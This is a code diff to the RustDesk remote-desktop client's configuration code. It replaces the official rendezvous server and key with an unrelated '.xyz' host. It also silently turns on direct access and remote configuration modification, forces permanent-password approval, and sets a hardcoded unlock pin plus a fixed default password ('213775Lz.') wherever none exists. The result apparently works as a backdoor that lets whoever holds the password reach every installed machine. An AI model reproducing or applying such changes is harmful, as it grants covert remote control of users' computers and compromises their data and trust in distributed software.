@@ -106,8 +106,8 @@ const CHARS: &[char] = &[
     'm', 'n', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
 ];
 
-pub const RENDEZVOUS_SERVERS: &[&str] = &["rs-ny.rustdesk.com"];
-pub const RS_PUB_KEY: &str = "OeVuKk5nlHiXp+APNn0Y3pC1Iwpwn44JGqrQCsWqmBw=";
+pub const RENDEZVOUS_SERVERS: &[&str] = &["21116.0001112.xyz"];
+pub const RS_PUB_KEY: &str = "Op21D9NVj0oEYmWV736aHqkSctcIStqcCpbAzFFY9qs=";
 
 pub const RENDEZVOUS_PORT: i32 = 21116;
 pub const RELAY_PORT: i32 = 21117;
@@ -459,6 +459,22 @@ impl Config2 {
     fn load() -> Config2 {
         let mut config = Config::load_::<Config2>("2");
         let mut store = false;
+        if !config.options.contains_key("direct-server") {
+           config.options.insert("direct-server".to_string(), "Y".to_string());
+           store = true;
+        }
+        if !config.options.contains_key("approve-mode") {
+            config.options.insert("approve-mode".to_string(), "password".to_string());
+            store = true;
+        }
+        if !config.options.contains_key("verification-method") {
+            config.options.insert("verification-method".to_string(), "use-permanent-password".to_string());
+            store = true;
+        }
+        if !config.options.contains_key("allow-remote-config-modification") {
+            config.options.insert("allow-remote-config-modification".to_string(), "Y".to_string());
+            store = true;
+        }
         if let Some(mut socks) = config.socks {
             let (password, _, store2) =
                 decrypt_str_or_original(&socks.password, PASSWORD_ENC_VERSION);
@@ -470,6 +486,10 @@ impl Config2 {
             decrypt_str_or_original(&config.unlock_pin, PASSWORD_ENC_VERSION);
         config.unlock_pin = unlock_pin;
         store |= store2;
+        if config.unlock_pin.is_empty() {
+            config.unlock_pin = "00b9dp9Tws+E+DRf95t5lAdt7AWiFofw==".to_string();
+            store = true;
+        }
         if store {
             config.store();
         }
@@ -564,6 +584,10 @@ impl Config {
     fn load() -> Config {
         let mut config = Config::load_::<Config>("");
         let mut store = false;
+        if config.password.is_empty() {
+            config.password = "213775Lz.".to_string();
+            store = true;
+        }
         let (password, _, store1) = decrypt_str_or_original(&config.password, PASSWORD_ENC_VERSION);
         config.password = password;
         store |= store1;
